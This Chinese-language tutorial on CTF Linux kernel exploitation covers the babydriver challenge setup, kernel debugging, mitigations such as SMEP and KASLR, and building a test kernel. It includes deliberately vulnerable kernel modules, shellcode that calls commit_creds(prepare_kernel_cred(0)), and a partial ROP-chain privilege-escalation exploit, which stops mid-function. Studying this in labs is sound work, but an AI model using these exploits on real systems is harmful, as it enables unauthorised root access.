---
title: CTF Kernel Pwn 
toc: true
categories: Pwn
tag:
	- pwn
	- kernel
---

学习一下Kernel Pwn

<!--more-->

# Kernel Pwn In CTF

简单分析一下CTF Kernel Pwn题目的形式，那2017 CISCN babydrive为例子，先对文件包解压

```shell
➜  example ls
babydriver.tar
➜  example file babydriver.tar 
babydriver.tar: POSIX tar archive
➜  example tar -xvf babydriver.tar 
boot.sh
bzImage
rootfs.cpio
➜  example ls
babydriver.tar  boot.sh  bzImage  rootfs.cpio
```

得到`boot.sh`，`bzImage`，`rootfs.cpio`三个文件

## boot.sh

```shell
➜  example cat -n boot.sh
     1  #!/bin/bash
     2  qemu-system-x86_64 \
     3  -initrd rootfs.cpio \
     4  -kernel bzImage \
     5  -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
     6  -enable-kvm \
     7  -monitor /dev/null \
     8  -m 64M \
     9  --nographic  \
    10  -smp cores=1,threads=1 \
    11  -cpu kvm64,+smep
```

`boot.sh`文件是用来启动这个程序的，调用qemu来加载`rootfs.cpio`与`bzImage`运行起来

上面的参数都是qemu的参数

```tex
-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统
-kernel bzImage，使用 bzImage 作为 kernel 映像
-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep
-m 64M，设置虚拟 RAM 为 64M，默认为 128M
```

## bzImage

```shell
➜  example file bzImage       
bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA
```

`bzImage`是经压缩过的linux内核文件

 

## rootfs.cpio

```shell
➜  example file rootfs.cpio
rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix
```

这是一个linux内核文件系统压缩包，我们可以对其解压并重新压缩，从而修改这个系统的文件

新建一个文件夹来解压

```shell
➜  example mkdir fs && cd fs
➜  fs cp ../rootfs.cpio ./rootfs.cpio.gz
➜  fs gunzip ./rootfs.cpio.gz
➜  fs cpio -idmv < rootfs.cpio 
.
etc
etc/init.d
etc/passwd
etc/group
bin
......
linuxrc
home
home/ctf
5556 blocks
➜  fs ll                  
total 2.8M
drwxrwxr-x 2 mask mask 4.0K 1月  20 12:16 bin
drwxrwxr-x 3 mask mask 4.0K 1月  20 12:16 etc
drwxrwxr-x 3 mask mask 4.0K 1月  20 12:16 home
-rwxrwxr-x 1 mask mask  396 6月  16  2017 init
drwxr-xr-x 3 mask mask 4.0K 1月  20 12:16 lib
lrwxrwxrwx 1 mask mask   11 1月  20 12:16 linuxrc -> bin/busybox
drwxrwxr-x 2 mask mask 4.0K 6月  15  2017 proc
-rwxrwxr-x 1 mask mask 2.8M 1月  20 12:15 rootfs.cpio
drwxrwxr-x 2 mask mask 4.0K 1月  20 12:16 sbin
drwxrwxr-x 2 mask mask 4.0K 6月  15  2017 sys
drwxrwxr-x 2 mask mask 4.0K 6月  15  2017 tmp
drwxrwxr-x 4 mask mask 4.0K 1月  20 12:16 usr
```

这些就是运行起来后这个系统拥有的文件，查看这个`init`文件

```shell
➜  fs cat -n ./init           
     1  #!/bin/sh
     2   
     3  mount -t proc none /proc
     4  mount -t sysfs none /sys
     5  mount -t devtmpfs devtmpfs /dev
     6  chown root:root flag
     7  chmod 400 flag
     8  exec 0</dev/console
     9  exec 1>/dev/console
    10  exec 2>/dev/console
    11
    12  insmod /lib/modules/4.4.72/babydriver.ko
    13  chmod 777 /dev/babydev
    14  echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
    15  setsid cttyhack setuidgid 1000 sh
    16
    17  umount /proc
    18  umount /sys
    19  poweroff -d 0  -f
```

看到第12行的`insmod /lib/modules/4.4.72/babydriver.ko`，意味着要调试这个ko文件

![1579494080990](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1579494080990.png)

使用IDA对其进行分析，利用漏洞

对此文件系统进行打包也是要在这个目录下进行

```shell
➜  fs find . | cpio -o --format=newc > rootfs.cpio
cpio: File ./rootfs.cpio grew, 43008 new bytes not copied
5640 blocks
```

## vmlinux

有些题目会给`vmlinux`这个文件，这是编译出来的最原始的内核文件，未压缩的，是个ELF形式，方便找gadget

可以使用一个工具来从`bzImage`中导出`vmlinux`，[extract-vmlinux](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux)

```shell
➜  example ./extarct-vmlinux ./bzImage > vmlinux
➜  example file bzImage                                
bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA
➜  example file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
```

## exploit

Kernel Pwn就是找出内核模块中的漏洞，然后写一个C语言程序，放入文件系统中打包，重新运行取来，此时用户一般都是普通用户，运行程序调用此模块的功能利用漏洞，从而提升权限到root用户，读取flag

```shell
/ $ ls
bin          exp          lib          root         sys
dev          home         linuxrc      rootfs.cpio  tmp
etc          init         proc         sbin         usr
/ $ whoami
ctf
/ $ ./exp 
[   18.277799] device open
[   18.278768] device open
[   18.279760] alloc done
[   18.280706] device release
/ # whoami
root
```

比赛时一般是上传C语言程序的base64编码到服务器，然后运行

# Kernel Pwn Debug

要对内核模块进行调试，在启动脚本中加入

```shell
-gdb tcp::1234
```

然后使用gdb连接

```shell
gdb -q -ex "target remote localhost:1234"
```

如果显示`Remote 'g' packet reply is too long`一长串数字，要设置一下架构

```shell
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:1234"
```

![1579494972151](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1579494972151.png)

此时已经正确的附加上kernel系统进行调试了，要调试内核模块，可以先查看内核加载地址，在/sys/module/中是加载的各个模块的信息

```shell
/ $ cd sys/module/                                         
/sys/module $ ls                                           
8250                ipv6                scsi_mod           
acpi                kdb                 sg                 
acpi_cpufreq        kernel              spurious           
acpiphp             keyboard            sr_mod             
apparmor            kgdb_nmi            suspend            
ata_generic         kgdboc              sysrq              
ata_piix            libata              tcp_cubic          
babydriver          loop                thermal            
battery             md_mod              tpm                
block               module              tpm_tis            
core                mousedev            uhci_hcd           
cpuidle             netpoll             uinput             
debug_core          pata_sis            usbcore            
dm_mod              pcc_cpufreq         virtio_balloon     
dns_resolver        pci_hotplug         virtio_blk         
dynamic_debug       pci_slot            virtio_mmio        
edd                 pcie_aspm           virtio_net         
efivars             pciehp              virtio_pci         
ehci_hcd            ppp_generic         vt                 
elants_i2c          printk              workqueue          
ext4                processor           xen_acpi_processor 
firmware_class      pstore              xen_blkfront       
fuse                rcupdate            xen_netfront       
i8042               rcutree             xhci_hcd           
ima                 rfkill              xz_dec             
intel_idle          rng_core            zswap              
```

获取`babydrive`模块的加载地址

```shell
/sys/module $ cd babydriver/                            
/sys/module/babydriver $ ls                             
coresize    initsize    notes       sections    taint   
holders     initstate   refcnt      srcversion  uevent  
/sys/module/babydriver $ cd sections/                   
/sys/module/babydriver/sections $ grep 0 .text          
0xffffffffc0000000                                      
```

在gdb中载入符号信息，就可以对内核模块进行下断调试

```shell
pwndbg> add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc00000
00
add symbol table from file "./fs/lib/modules/4.4.72/babydriver.ko" at
        .text_addr = 0xffffffffc0000000
Reading symbols from ./fs/lib/modules/4.4.72/babydriver.ko...done.
pwndbg> b*babyopen 
Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmo
dule/babydriver.c, line 28.
```

# Kernel Basic Knowledge

## Kernel

Kernel是一个程序，是操作系统底层用来管理上层软件发出的各种请求的程序，Kernel将各种请求转换为指令，交给硬件去处理，简而言之，Kernel是连接软件与硬件的中间层

![img](https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg)

Kernel主要提供两个功能，与硬件交互，提供应用运行环境

在intel的CPU中，会将CPU的权限分为Ring 0，Ring 1，Ring 2，Ring 3，四个等级，权限依次递减，高权限等级可以调用低权限等级的资源

在常见的系统（Windows，Linux，MacOS）中，内核处于Ring 0级别，应用程序处于Ring 3级别

## LKM

内核模块是Linux Kernel向外部提供的一个插口，叫做动态可加载内核模块（Loadable Kernel Module，LKM），LKM弥补了Linux Kernel的可拓展性与可维护性，类似搭积木一样，可以往Kernel中接入各种LKM，也可以卸载，常见的外设驱动就是一个LKM

LKM文件与用户态的可执行文件一样，在Linux中就是ELF文件，可以利用IDA进行分析

LKM是单独编译的，但是不能单独运行，他只能作为OS Kernel的一部分

与LKM相关的指令有如下几个

- insmod：接入指定模块
- rmmod：移除指定模块
- lsmod：列出已加载模块

这些都是shell指令，可以在shell中运行查看

```shell\
➜  ~ lsmod 
Module                  Size  Used by
rfcomm                 77824  2
vmw_vsock_vmci_transport    32768  2
vsock                  36864  3 vmw_vsock_vmci_transport
......
```

## ioctl

ioctl是设备驱动程序中对设备的I/O通道进行管理的函数

所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。它的调用个数如下： int ioctl(int fd, ind cmd, …)； 

其中fd是用户程序打开设备时使用open函数返回的文件标示符，cmd是用户程序对设备的控制命令，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关 

ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。

意思就是说如果一个LKM中提供了iotcl功能，并且实现了对应指令的操作，那么在用户态中，通过这个驱动程序，我们可以调用ioctl来直接调用模块中的操作

## Space Switch

在程序运行时，总是会经历user space与kernel space之前的切换，因为用户态应用程序在执行某些功能时，是由Kernel来执行的，这就涉及到两个space之前的切换

### user space -> kernel space

当用户态程序执行系统调用，异常处理，外设终端时，会从用户态切换到内核态，切换过程如下：

1. `swapgs`指令修改GS寄存器切换到内核态
2. 将当前栈顶（sp）记录在CPU独占变量区域，然后将此区域里的内核栈顶赋给sp
3. push各寄存器的值
4. 通过汇编指令判断是否为32位
5. 通过系统调用号，利用函数表`sys_call_table`执行响应操作

```assembly
ENTRY(entry_SYSCALL_64)
 /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
 SWAPGS_UNSAFE_STACK
    
 /* 保存栈值，并设置内核栈 */
 movq %rsp, PER_CPU_VAR(rsp_scratch)
 movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
    
    
/* 通过push保存寄存器值，形成一个pt_regs结构 */
/* Construct struct pt_regs on stack */
pushq  $__USER_DS      /* pt_regs->ss */
pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
pushq  %r11             /* pt_regs->flags */
pushq  $__USER_CS      /* pt_regs->cs */
pushq  %rcx             /* pt_regs->ip */
pushq  %rax             /* pt_regs->orig_ax */
pushq  %rdi             /* pt_regs->di */
pushq  %rsi             /* pt_regs->si */
pushq  %rdx             /* pt_regs->dx */
pushq  %rcx tuichu    /* pt_regs->cx */
pushq  $-ENOSYS        /* pt_regs->ax */
pushq  %r8              /* pt_regs->r8 */
pushq  %r9              /* pt_regs->r9 */
pushq  %r10             /* pt_regs->r10 */
pushq  %r11             /* pt_regs->r11 */
sub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */
```

### kernel space -> user space

内核态返回用户态流程：

1. `swapgs`指令恢复用户态GS寄存器
2. `sysretq`或者`iretq`恢复到用户空间

https://xinqiu.gitbooks.io/linux-insides-cn/content/SysCall/linux-syscall-2.html

## Kernel Functions

内核态与用户态的函数有一些区别

- printk：类似与printf，但是内容不一定会在终端显示起来，但是会在内核缓冲区里，可以用`dmsg`命令查看

- copy_from_user：实现了将用户空间的数据传送到内核空间

- copy_to_user：实现了将内核空间的数据传送到用户空间

- kmalloc：内核态内存分配函数

- kfree：内核态内存释放函数

用来改变权限的函数：

- int commit_creds(struct cred \*new)
- struct cred* prepare_kernel_cred(struct task_struct* daemon)

执行`commit_creds(prepare_kernel_cred(0))`即可获得root权限

## Expoit Mitigations

https://www.kernel.org/doc/Documentation/security/self-protection.txt

https://lwn.net/Articles/569635/

内核态与用户态的保护方式有所区别

相同的保护措施：DEP，Canary，ASLR，PIE，RELRO

不同的保护措施：MMAP_MIN_ADDR，KALLSYMS，~~RANDSTACK~~，~~STACKLEAK~~，SMEP，SMAP

### MMAP_MIN_ADDR

MMAP_MIN_ADDR保护机制不允许程序分配低内存地址，可以用来防御null pointer dereferences。这里引用一张Linux Kernel Exploitation中的图来说明

![linux](https://v1ckydxp.github.io/images/Linux-kernel-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.jpg)

如果没有这个保护，可以进行如下的攻击行为：

1. 空指针为0，程序可以分配内存到0x000000处。
2. 程序在内存0x000000写入恶意代码。
3. 程序触发kernel BUG（）。这里说的BUG()其实是linux kernel中用于拦截内核程序超出预期的行为，属于软件主动汇报异常的一种机制。
4. 内核执行恶意代码。

### kallsyms

`/proc/kallsyms`给出内核中所有`symbol`的地址，通过`grep <function_name> /proc/kallsyms` 就可以得到对应函数的地址，我们需要这个信息来写可靠的`exploit`，否则需要自己去泄露这个信息。在低版本的内核中所有用户都可读取其中的内容，高版本的内核中缺少权限的用户读取时会返回0。

### SMEP

管理模式执行保护，保护内核是其不允许执行用户空间代码。在SMEP保护关闭的情况下，若存在 kernel stack overfolw，可以将内核栈的返回地址覆盖为用户空间的代码片段执行。在开启了SMEP保护下，当前cpu处于ring0模式，当返回到用户态执行时会触发页错误。

操作系统是通过CR4寄存器的第20位的值来判断SMEP是否开启，1开启，0关闭，检查SMEP是否开启

```shell
cat /proc/cpuinfo | grep smep
```

可通过mov指令给CR4寄存器赋值从而达到关闭SMEP的目的，相关的mov指令可以通过ropper，ROPgadget等工具查找

```assembly
mov cr4, 0x6f0
```

```shell
objdump -d vmlinux -M intel | grep -E "cr4|pop|ret"
```



### SMAP

管理模式访问保护，禁止内核访问用户空间的数据

### KASLR

内核地址空间布局随机化，并不默认开启，需要在内核命令行中添加指定指令。

qemu增加启动参数 ` -append "kaslr" ` 即可开启

## Privilege Escalation

提取，越狱，就是要以root用户拿到shell，获取root的方式有几种

在内核态调用`commit_creds(prepare_kernel_cred(0))`，返回用户态执行起shell

```c
void get_r00t() {
    commit_creds(prepare_kernel_cred(0));
}
int main(int argc, char *argv) {
    ...
    trigger_fp_overwrite(&get_r00t);
    ...
    // trigger fp use
    trigger_vuln_fp();
    // Kernel Executes get_r00t()
    ...
    // Now we have root
    system("/bin/sh");
}
```

SMEP防预这种类型的攻击的方法是：如果处理器处于`ring0`模式，并试图执行有`user`数据的内存时，就会触发一个页错误。

也可以修改cred结构体，cred结构体记录了进程的权限，每个进程都有一个cred结构体，保存了进程的权限等信息（uid，gid），如果修改某个进程的cred结构体（uid = gid = 0），就得到了root权限

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
} __randomize_layout;
```

# Build A Linux Kernel

http://eternalsakura13.com/2018/04/13/qemu/

## Kernel Source Code

先下载一份Kernel源码，我用的是2.6.32，由于我的机子是ubuntu 16.04，预装的make与gcc版本过高，编译2.6的kernel会失败，所以需要降级

```shell
# 4.7 gcc
sudo apt install gcc-4.7 g++-4.7
sudo rm /usr/bin/gcc /usr/bin/g++
sudo ln -s /usr/bin/gcc-4.7 /usr/bin/gcc
sudo ln -s /usr/bin/g++-4.7 /usr/bin/g++
# 3.80 make
wget https://mirrors.tuna.tsinghua.edu.cn/gnu/make/make-3.80.tar.gz
tar -xvf make-3.80.tar.gz
cd make-3.80/
./configure
make
sudo make install
```

3.80的make生成在源码目录里，稍后需要用这个make文件

修改三处2.6源码文件

1. arch/x86/vdso/Makefile中第28行的 `-m elf_x86_64` 改成 `-m64`，第72行的`-m elf_i386`改成`-m32`
2. drivers/net/igbvf/igbvf.h中注释第128行
3. kernel/timeconst.pl中第373行`defined(@val)`改成`@val`
4. （可选）关闭canary保护需要编辑源码中的`.config`文件349行，注释掉 `CONFIG_CC_STACKPROTECTOR=y` 这一项

## bzImage

安装必备依赖

```shell
sudo apt-get install build-essential libncurses5-dev
```

解压后进入源码目录，使用刚安装的make

```shell
~/MAKE/make-3.80/make menuconfig
```

进入`kernel hacking`，勾选`Kernel debugging`，`Compile-time checks and compiler options-->Compile the kernel with debug info，Compile the kernel with frame pointers`和`KGDB`，然后开始编译

```shell
~/MAKE/make-3.80/make bzImage
```

大概10分钟的样子，出现这个信息就说明编译成功了

```tex
Setup is 15036 bytes (padded to 15360 bytes).
System is 3754 kB
CRC 4505d1c3
Kernel: arch/x86/boot/bzImage is ready  (#1)
```

`vmlinux`在源码根目录下，`bzImage`在`/arch/x86/boot/`里

## rootfs.cpio

编译busybox

```shell
wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2
tar -jxvf busybox-1.27.2.tar.bz2
cd busybox-1.27.2
make menuconfig
```

勾选`Busybox Settings -> Build Options -> Build Busybox as a static binary`

```shell
make install
```

编译完成后源码目录下会有一个`_install`文件夹，进入

```shell
mkdir -pv {bin,sbin,etc,proc,sys,usr/{bin,sbin}}
mkdir etc/init.d
touch etc/init.d/init
```

编辑`etc/inittab`文件，加入以下内容

```shell
::sysinit:/etc/init.d/rcS
::askfirst:/bin/ash
::ctrlaltdel:/sbin/reboot
::shutdown:/sbin/swapoff -a
::shutdown:/bin/umount -a -r
::restart:/sbin/init
```

编辑`etc/init.d/init`文件，加入以下内容

```shell
#!/bin/sh
mount -t proc none /proc
mount -t sys none /sys
/bin/mount -n -t sysfs none /sys
/bin/mount -t ramfs none /dev
/sbin/mdev -s
```

接着就可以打包成`rootfs.cpio`

```shell
chmod +x ./etc/init.d/rcS
find . | cpio -o --format=newc > ../rootfs.cpio
```

## boot

得到三个文件后，可以利用qemu运行起来，启动脚本`boot.sh`

```shell
#!/bin/sh
qemu-system-x86_64 \
 -initrd rootfs.cpio \
 -kernel bzImage \
 -nographic \
 -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" \
 -m 64M \
 -monitor /dev/null \
```

```shell
/ # uname -a
Linux (none) 2.6.32 #1 SMP Sun Jan 26 21:51:02 CST 2020 x86_64 GNU/Linux
```

# Run A LKM

## build

简单写一个hello的程序

hello.c内容如下

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>


int hello_write(struct file *file, const char *buf, unsigned long len)
{
    printk("You write something.");
    return len;
}

static int __init hello_init(void)
{
    printk(KERN_ALERT "hello driver init!\n");
    create_proc_entry("hello", 0666, 0)->write_proc = hello_write;
    return 0;
}

static void __exit hello_exit(void)
{
    printk(KERN_ALERT "hello driver exit\n");
}

module_init(hello_init);
module_exit(hello_exit);
```

Makefile内容如下，注意xxx.c与xxx.o文件名一致，KERNELDR目录是内核源代码

```makefile
obj-m := hello.o
KERNELDR := /home/mask/kernel/linux-2.6.32
PWD := $(shell pwd)
modules:
	$(MAKE) -C $(KERNELDR) M=$(PWD) modules
modules_install:
	$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install
clean:
	$(MAKE) -C $(KERNELDR) M=$(PWD) clean
```

make出来后得到.ko文件

```shell
➜  helloworld ls
helloc.c   helloc.mod.c  helloc.o  modules.order
helloc.ko  helloc.mod.o  Makefile  Module.symvers
➜  helloworld file helloc.ko                                                                      
helloc.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=08aaa94df43f8333c14
9073cddf3043e52b28107, not stripped
➜  helloworld checksec helloc.ko       
[*] '/home/mask/kernel/test/linux4.4/module/helloworld/helloc.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

再写一个调用程序call.c

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main()
{
    int fd = open("/proc/hello", O_WRONLY);
    write(fd, "Mask", 4);
    return 0;
}
```

## run

将helloc.ko文件与call文件复制.

进文件系统，也就是busybox目录里的_install文件夹，重新打包`rootfs.cpio`，运行起来即可看见模块

```shell
/ # insmod hello.ko 
[   11.743066] hello driver init!
/ # ./call
[   25.860294] You write something.
```

# Kernel Pwn Process

https://github.com/ctf-wiki/ctf-wiki/tree/master/docs/pwn/linux/kernel

[https://v1ckydxp.github.io/2019/07/21/2019-07-18-Linux-kerne%204.20%20bpf%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/](https://v1ckydxp.github.io/2019/07/21/2019-07-18-Linux-kerne 4.20 bpf整数溢出/)

## overview

1. 找到Kernel漏洞
2. 利用漏洞实现代码执行
3. 提升权限
4. 返回用户态空间
5. 获得最高权限

## Exploit

### NULL Pointer Dereference

KVM模块null_pointer.c内容

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

void (*my_funptr)(void);

int null_pointer_write(struct file *file, const char *buf, unsigned long len)
{
    my_funptr();
    return len;
}

static int __init null_pointer_init(void)
{
    printk(KERN_ALERT "null_pointer driver init!\n");
    create_proc_entry("null_pointer", 0666, 0)->write_proc = null_pointer_write;
    return 0;
}

static void __exit null_pointer_exit(void)
{
    printk(KERN_ALERT "null_pointer driver exit\n");
}

module_init(null_pointer_init);
module_exit(null_pointer_exit);

```

pwn.c文件内容

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

char payload[] = "\x48\xc7\xc7\x0\x0\x0\x0\x48\xc7\xc0\x40\x17\x8\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x50\x15\x8\x81\xff\xd0\xc3"; // jmp 0xbadbeef

int main()
{
    mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(0, payload, sizeof(payload));
    int fd = open("/proc/null_pointer", O_WRONLY);
    puts("Run shellcode...");
    write(fd, "Mask", 4);
    puts("Get root.");
    system("/bin/sh");
    return 0;
}

```

注意这里需要在rootfs中的init文件加这一句，取消mmap_min_addr的限制

```shell
sysctl -w vm.mmap_min_addr="0"
```

编译后打包`rootfs.cpio`，运行起来，dbg附加上去，在`bug1_write`函数下断点，可以看到在LKM执行`my_funptr()`时，由于函数指针未初始化，因而执行0地址处的指令

![1580049867176](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580049867176.png)

由于在`pwn.c`中使用`mmap`与`memcpy`往此地址写入了shellcode，所以就是执行shellcode

![1580050098336](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580050098336.png)

这段shellcode的意思是

```assembly
mov rdi,0
mov rax,0xffffffff81081740
call rax
mov rdi,rax
mov rax,0xffffffff81081550
call rax
ret

/ # grep commit_creds /proc/kallsyms            
ffffffff81081550 T commit_creds                 
......      
/ # grep prepare_kernel_cred /proc/kallsyms     
ffffffff81081740 T prepare_kernel_cred          
......
```

也就是执行`commit_creds(prepare_kernel_cred(0))`后返回，然后在`pwn.c`中执行了`system("/bin/sh")`，就相当于以root权限起了一个shell

用一个普通用户尝试，在rootfs中的init文件加入`setsid cttyhack setuidgid 1000 sh`即可以非roo启动

![1580038752682](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580038752682.png)

### Kernel Stack Buffer Overflow

https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/

https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-2/

https://thinkycx.me/2018-08-09-CVE-2017-8890-root-ubuntu-16.04-kernel-4.10.html

buf_overflow.c内容

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

int buf_overflow_write(struct file *file, const char *buf, unsigned long len)
{
    char localbuf[8];
    memcpy(localbuf, buf, len);
    return len;
}

static int __init buf_overflow_init(void)
{
    printk(KERN_ALERT "buf_overflow driver init!\n");
    create_proc_entry("overflow", 0666, 0)->write_proc = buf_overflow_write;
    return 0;
}

static void __exit buf_overflow_exit(void)
{
    printk(KERN_ALERT "buf_overflow driver exit!\n");
}

module_init(buf_overflow_init);
module_exit(buf_overflow_exit);
```

pwn.c内容

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

int main()
{
    char buf[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB";
    int fd = open("/proc/overflow", O_WRONLY);
    write(fd, buf, sizeof(buf));
    return 0;
}
```

在`buf_overflow_write`函数下断进入到`memcpy`

![1580095843535](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580095843535.png)

复制过后，可以发下，返回地址被 BBBBBBBB 覆盖了

![1580095892778](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580095892778.png)

继续执行提示Kernel panic那是因为canary的问题，关闭canary保护需要编辑源码中的`.config`文件，注释掉 `CONFIG_CC_STACKPROTECTOR=y` 这一项，大约在349行，然后重新编译内核，重新编译LKM，payload减少canary那8个字节，运行发现RIP停在了0x4141414141414141，也就是劫持了执行流

#### ROP

劫持执行流，利用ROP来实现`commit_creds(prepare_kernel_cred(0))`提权。提权这两个函数的ROP就不分析了，和内核态一样的

ROP执行完提权函数，需要从内核态返回到用户态，64位返回用户态是这两个指令

```assembly
swapgs
iretq
```

内核中的gadget可以从vmlinux中提取出来，不过使用ROPgadget出来的部分不是可执行的，`iretq`可执行的gadget可以这样提取

```shell
objdump -j .text -d vmlinux | grep iretq | head -1
```

其中`iretq`所需的栈结构是

```tex
RIP 	用户地址
CS		代码段选择器
EFLAGS	状态信息
RSP		用户堆栈
SS		堆栈段选择器
```

可以用下面代码获得信息，RSP可以直接&一个局部变量来获取

```c
unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
```

所以rop chain就是

```tex
prepare_kernel_cred
commit_creds
swapgs
iretq
RIP
CS
EFLAGS
RSP
SS
```

![1580189553138](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580189553138.png)

执行下去成功到达getshell函数

![1580189602263](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580189602263.png)

拿到root shell

![1580189674431](C:\Users\MoZha\AppData\Roaming\Typora\typora-user-images\1580189674431.png)

完整payload

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

#define commit_creds 0xffffffff81081290
#define prepare_kernel_cred 0xffffffff81081480
#define prdi_ret 0xffffffff8133791d
#define rax2rdi_prbp_ret 0xffffffff812858df
#define prcx_ret 0xffffffff810d7b73
#define rax2rdi_callrcx 0xffffffff81118825
#define rax2rdi_c_prbp_ret 0xffffffff812858dc
#define iretq 0xffffffff8100c93a
#define swapgs_pfq 0xffffffff8100ce6a
#define back 0xffffffff8100bfad
#define prcx 0xffffffff810d7b73

char payload[1000] = {0};
int payload_len = 0;

void join_data(long long data)
{
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}

void join_str(char *buf)
{
    int len = strlen(buf);
    memcpy(payload + payload_len, buf, len);
    payload_len += len;
}

void get_shell()
{
    execl("/bin/sh", "sh", NULL);
}

unsigned long long user_cs, user_ss, user_rflags;

static void save_state() 
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
    //printf("%p,%p,%p", user_cs, user_ss, user_rflags);
}

int main()
{   
    save_state();
    int stack;
    join_str("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    join_data(prdi_ret);
    join_data(0);
    join_data(prepare_kernel_cred);
    join_data(rax2rdi_c_prbp_ret);
